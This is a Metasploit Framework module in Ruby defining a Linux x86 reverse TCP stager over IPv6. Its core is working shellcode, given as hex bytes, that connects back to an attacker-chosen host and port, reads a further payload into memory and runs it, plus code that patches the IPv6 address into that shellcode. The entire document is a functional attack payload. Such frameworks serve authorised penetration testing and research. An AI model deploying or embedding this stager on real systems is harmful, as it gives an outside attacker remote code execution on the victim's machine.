##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Linux Reverse TCP/IPv6 Stager
module MetasploitModule
  CachedSize = 77

  include Msf::Payload::Stager
  include Msf::Payload::Linux::X86::Prepends

  def self.handler_type_alias
    'reverse_ipv6_tcp'
  end

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Reverse TCP Stager (IPv6)',
        'Description' => 'Connect back to attacker over IPv6',
        'Author' => 'kris katterjohn',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X86,
        'Handler' => Msf::Handler::ReverseTcp,
        'Stager' => {
          'Offsets' => {
            'ADDR' => [ 0x15, 'foo' ],
            'LPORT' => [ 0x2c, 'n' ],
            'SCOPEID' => [ 0x11, 'V' ]
          },
          'Payload' =>
              "\x31\xdb\x53\x43\x53\x6a\x0a\x89\xe1\x6a\x66\x58\xcd\x80\x96\x99" \
              "\x68\x00\x00\x00\x00\x68\xde\xad\xbe\xef\x68\xde\xad\xbe\xef\x68" \
              "\xde\xad\xbe\xef\x68\xde\xad\xbe\xef\x52\x66\x68\xbf\xbf\x66\x68" \
              "\x0a\x00\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd" \
              "\x80\x89\xf3\xb6\x0c\xb0\x03\xcd\x80\x89\xdf\xff\xe1"
        }
      )
    )

    register_options([
      OptInt.new('SCOPEID', [false, 'IPv6 scope ID, for link-local addresses', 0])
    ])
  end

  # This isn't pretty, but then again neither are IPv6 addresses --Kris
  def replace_var(raw, name, offset, _pack)
    return false unless name == 'ADDR'

    addr = ''
    substitute_vars(addr, { 'LHOST' => [ 0, 'ADDR6' ] })

    repl = ''

    addr.unpack('V*').reverse.each do |x|
      repl += Rex::Arch::X86.push_dword(x)
    end

    raw[offset, repl.length] = repl

    true
  end
end
